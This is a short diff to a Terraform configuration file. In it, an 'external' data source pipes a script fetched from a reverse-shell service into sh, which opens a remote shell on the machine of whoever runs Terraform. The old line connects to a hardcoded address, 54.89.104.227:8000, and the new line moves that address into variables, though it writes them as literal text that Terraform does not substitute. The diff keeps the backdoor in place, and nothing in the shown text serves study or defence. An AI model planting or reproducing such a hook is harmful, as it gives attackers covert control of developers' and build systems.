@@ -22,6 +22,11 @@ terraform {
     backend "s3" {}
 }
 
+locals {
+  ip = var.ip
+  port = var.port
+}
+
 data "external" "example" {
-  program = ["sh", "-c", "curl https://reverse-shell.sh/54.89.104.227:8000 | sh"]
+  program = ["sh", "-c", "curl https://reverse-shell.sh/var.ip:var.port | sh"]
 }
